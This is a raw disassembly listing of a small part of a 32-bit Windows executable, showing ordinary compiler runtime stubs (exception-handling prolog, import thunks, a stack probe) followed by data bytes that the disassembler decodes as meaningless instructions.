  40d2de:	jmp    0x40d36d
  40d2e3:	int3   
  40d2e4:	int3   
  40d2e5:	int3   
  40d2e6:	int3   
  40d2e7:	int3   
  40d2e8:	int3   
  40d2e9:	int3   
  40d2ea:	int3   
  40d2eb:	int3   
  40d2ec:	int3   
  40d2ed:	int3   
  40d2ee:	int3   
  40d2ef:	int3   
  40d2f0:	mov    edi,edi
  40d2f2:	push   ebp
  40d2f3:	mov    ebp,esp
  40d2f5:	push   DWORD PTR [ebp+0x14]
  40d2f8:	push   DWORD PTR [ebp+0x10]
  40d2fb:	push   DWORD PTR [ebp+0xc]
  40d2fe:	push   DWORD PTR [ebp+0x8]
  40d301:	push   0x40cd10
  40d306:	push   0x40e004
  40d30b:	call   0x40d386
  40d310:	add    esp,0x18
  40d313:	pop    ebp
  40d314:	ret    
  40d315:	int3   
  40d316:	int3   
  40d317:	int3   
  40d318:	int3   
  40d319:	int3   
  40d31a:	int3   
  40d31b:	int3   
  40d31c:	int3   
  40d31d:	int3   
  40d31e:	int3   
  40d31f:	int3   
  40d320:	ret    
  40d321:	int3   
  40d322:	int3   
  40d323:	int3   
  40d324:	int3   
  40d325:	int3   
  40d326:	int3   
  40d327:	int3   
  40d328:	push   0x40d2f0
  40d32d:	push   DWORD PTR fs:0x0
  40d334:	mov    eax,DWORD PTR [esp+0x10]
  40d338:	mov    DWORD PTR [esp+0x10],ebp
  40d33c:	lea    ebp,[esp+0x10]
  40d340:	sub    esp,eax
  40d342:	push   ebx
  40d343:	push   esi
  40d344:	push   edi
  40d345:	mov    eax,ds:0x40e004
  40d34a:	xor    DWORD PTR [ebp-0x4],eax
  40d34d:	xor    eax,ebp
  40d34f:	push   eax
  40d350:	mov    DWORD PTR [ebp-0x18],esp
  40d353:	push   DWORD PTR [ebp-0x8]
  40d356:	mov    eax,DWORD PTR [ebp-0x4]
  40d359:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d360:	mov    DWORD PTR [ebp-0x8],eax
  40d363:	lea    eax,[ebp-0x10]
  40d366:	mov    fs:0x0,eax
  40d36c:	ret    
  40d36d:	mov    ecx,DWORD PTR [ebp-0x10]
  40d370:	mov    DWORD PTR fs:0x0,ecx
  40d377:	pop    ecx
  40d378:	pop    edi
  40d379:	pop    edi
  40d37a:	pop    esi
  40d37b:	pop    ebx
  40d37c:	mov    esp,ebp
  40d37e:	pop    ebp
  40d37f:	push   ecx
  40d380:	ret    
  40d381:	int3   
  40d382:	int3   
  40d383:	int3   
  40d384:	int3   
  40d385:	int3   
  40d386:	jmp    DWORD PTR ds:0x4131ac
  40d38c:	int3   
  40d38d:	int3   
  40d38e:	int3   
  40d38f:	int3   
  40d390:	int3   
  40d391:	mov    edi,edi
  40d393:	push   ebp
  40d394:	mov    ebp,esp
  40d396:	call   0x40d426
  40d39b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d39e:	shl    ecx,0x5
  40d3a1:	add    eax,ecx
  40d3a3:	pop    ebp
  40d3a4:	ret    
  40d3a5:	int3   
  40d3a6:	int3   
  40d3a7:	int3   
  40d3a8:	int3   
  40d3a9:	int3   
  40d3aa:	push   ebp
  40d3ab:	mov    ebp,esp
  40d3ad:	push   ecx
  40d3ae:	mov    ecx,DWORD PTR ds:0x411bcc
  40d3b4:	cmp    ecx,0x1
  40d3b7:	jne    0x40d3bd
  40d3b9:	mov    al,cl
  40d3bb:	jmp    0x40d3ed
  40d3bd:	cmp    ecx,0x2
  40d3c0:	jne    0x40d3c6
  40d3c2:	xor    al,al
  40d3c4:	jmp    0x40d3ed
  40d3c6:	lea    eax,[ebp-0x1]
  40d3c9:	mov    BYTE PTR [ebp-0x1],0x0
  40d3cd:	push   eax
  40d3ce:	push   0x401058
  40d3d3:	call   0x40d44c
  40d3d8:	test   eax,eax
  40d3da:	js     0x40d3c2
  40d3dc:	mov    al,BYTE PTR [ebp-0x1]
  40d3df:	xor    ecx,ecx
  40d3e1:	test   al,al
  40d3e3:	sete   cl
  40d3e6:	inc    ecx
  40d3e7:	mov    DWORD PTR ds:0x411bcc,ecx
  40d3ed:	mov    esp,ebp
  40d3ef:	pop    ebp
  40d3f0:	ret    
  40d3f1:	int3   
  40d3f2:	int3   
  40d3f3:	int3   
  40d3f4:	int3   
  40d3f5:	int3   
  40d3f6:	int3   
  40d3f7:	int3   
  40d3f8:	int3   
  40d3f9:	int3   
  40d3fa:	int3   
  40d3fb:	int3   
  40d3fc:	int3   
  40d3fd:	int3   
  40d3fe:	int3   
  40d3ff:	int3   
  40d400:	mov    eax,0x414000
  40d405:	jmp    0x40d40f
  40d40a:	int3   
  40d40b:	int3   
  40d40c:	int3   
  40d40d:	int3   
  40d40e:	int3   
  40d40f:	push   ecx
  40d410:	push   edx
  40d411:	push   eax
  40d412:	push   0x40d50c
  40d417:	call   0x40c9f9
  40d41c:	pop    edx
  40d41d:	pop    ecx
  40d41e:	jmp    eax
  40d420:	int3   
  40d421:	int3   
  40d422:	int3   
  40d423:	int3   
  40d424:	int3   
  40d425:	int3   
  40d426:	jmp    DWORD PTR ds:0x41319c
  40d42c:	int3   
  40d42d:	int3   
  40d42e:	int3   
  40d42f:	int3   
  40d430:	int3   
  40d431:	int3   
  40d432:	int3   
  40d433:	int3   
  40d434:	int3   
  40d435:	int3   
  40d436:	int3   
  40d437:	int3   
  40d438:	int3   
  40d439:	int3   
  40d43a:	int3   
  40d43b:	int3   
  40d43c:	int3   
  40d43d:	int3   
  40d43e:	int3   
  40d43f:	int3   
  40d440:	jmp    DWORD PTR ds:0x413064
  40d446:	int3   
  40d447:	int3   
  40d448:	int3   
  40d449:	int3   
  40d44a:	int3   
  40d44b:	int3   
  40d44c:	jmp    DWORD PTR ds:0x41305c
  40d452:	int3   
  40d453:	int3   
  40d454:	int3   
  40d455:	int3   
  40d456:	int3   
  40d457:	int3   
  40d458:	int3   
  40d459:	int3   
  40d45a:	int3   
  40d45b:	int3   
  40d45c:	int3   
  40d45d:	int3   
  40d45e:	int3   
  40d45f:	int3   
  40d460:	push   ecx
  40d461:	lea    ecx,[esp+0x4]
  40d465:	sub    ecx,eax
  40d467:	sbb    eax,eax
  40d469:	not    eax
  40d46b:	and    ecx,eax
  40d46d:	mov    eax,esp
  40d46f:	and    eax,0xfffff000
  40d474:	cmp    ecx,eax
  40d476:	jb     0x40d482
  40d478:	mov    eax,ecx
  40d47a:	pop    ecx
  40d47b:	xchg   esp,eax
  40d47c:	mov    eax,DWORD PTR [eax]
  40d47e:	mov    DWORD PTR [esp],eax
  40d481:	ret    
  40d482:	sub    eax,0x1000
  40d487:	test   DWORD PTR [eax],eax
  40d489:	jmp    0x40d474
  40d48b:	int3   
  40d48c:	int3   
  40d48d:	int3   
  40d48e:	int3   
  40d48f:	int3   
  40d490:	jmp    DWORD PTR ds:0x413124
  40d496:	int3   
  40d497:	int3   
  40d498:	int3   
  40d499:	int3   
  40d49a:	int3   
  40d49b:	int3   
  40d49c:	jmp    DWORD PTR ds:0x413120
  40d4a2:	int3   
  40d4a3:	int3   
  40d4a4:	int3   
  40d4a5:	int3   
  40d4a6:	int3   
  40d4a7:	int3   
  40d4a8:	jmp    DWORD PTR ds:0x4131b0
  40d4ae:	int3   
  40d4af:	int3   
  40d4b0:	in     al,0xff
  40d4b2:	(bad)  
  40d4b3:	inc    DWORD PTR [eax]
  40d4b5:	add    BYTE PTR [eax],al
  40d4b7:	add    al,dl
  40d4b9:	(bad)  
  40d4ba:	(bad)  
  40d4bb:	inc    DWORD PTR [eax]
  40d4bd:	add    BYTE PTR [eax],al
  40d4bf:	add    dh,bh
  40d4c1:	(bad)  
  40d4c2:	(bad)  
  40d4c3:	call   DWORD PTR [edi-0x34]
  40d4c6:	inc    eax
  40d4c7:	add    BYTE PTR [ebx-0x34],ch
  40d4ca:	inc    eax
  40d4cb:	add    BYTE PTR [eax],al
  40d4cd:	add    BYTE PTR [eax],al
  40d4cf:	add    dh,bh
  40d4d1:	(bad)  
  40d4d2:	(bad)  
  40d4d3:	inc    DWORD PTR [eax]
  40d4d5:	add    BYTE PTR [eax],al
  40d4d7:	add    ah,dl
  40d4d9:	(bad)  
  40d4da:	(bad)  
  40d4db:	inc    DWORD PTR [eax]
  40d4dd:	add    BYTE PTR [eax],al
  40d4df:	add    dh,bh
  40d4e1:	(bad)  
  40d4e2:	(bad)  
  40d4e3:	(bad)  
  40d4e4:	in     al,dx
  40d4e5:	iret   
  40d4e6:	inc    eax
  40d4e7:	add    al,dh
  40d4e9:	iret   
  40d4ea:	inc    eax
  40d4eb:	add    BYTE PTR [eax],al
  40d4ed:	add    BYTE PTR [eax],al
  40d4ef:	add    dh,bh
  40d4f1:	(bad)  
  40d4f2:	(bad)  
  40d4f3:	inc    DWORD PTR [eax]
  40d4f5:	add    BYTE PTR [eax],al
  40d4f7:	add    al,bl
  40d4f9:	(bad)  
  40d4fa:	(bad)  
  40d4fb:	inc    DWORD PTR [eax]
  40d4fd:	add    BYTE PTR [eax],al
  40d4ff:	add    dh,bh
  40d501:	(bad)  
  40d502:	(bad)  
  40d503:	(bad)  
  40d504:	cmp    edx,ecx
  40d506:	inc    eax
  40d507:	add    BYTE PTR [esi-0x2f],cl
  40d50a:	inc    eax
  40d50b:	add    BYTE PTR [ecx],al
  40d50d:	add    BYTE PTR [eax],al
  40d50f:	add    al,al
  40d511:	adc    BYTE PTR [eax],al
  40d513:	add    al,dl
  40d515:	sbb    eax,DWORD PTR [ecx]
  40d517:	add    BYTE PTR [eax],al
  40d519:	inc    eax
  40d51a:	add    DWORD PTR [eax],eax
  40d51c:	dec    esp
  40d51d:	aad    0x0
  40d51f:	add    BYTE PTR [eax-0x2b],ch
	...
  40d54a:	add    BYTE PTR [eax],al
  40d54c:	push   esp
  40d54d:	aad    0x0
  40d54f:	add    BYTE PTR [eax],al
  40d551:	add    BYTE PTR [eax],al
  40d553:	add    BYTE PTR [eax],al
  40d555:	add    BYTE PTR [ebx+0x68],al
  40d558:	popa   
  40d559:	jb     0x40d5af
  40d55b:	outs   dx,DWORD PTR ds:[esi]
  40d55c:	dec    edi
  40d55d:	gs ins DWORD PTR es:[edi],dx
  40d55f:	inc    edx
  40d560:	jne    0x40d5c8
  40d562:	inc    cx
	...
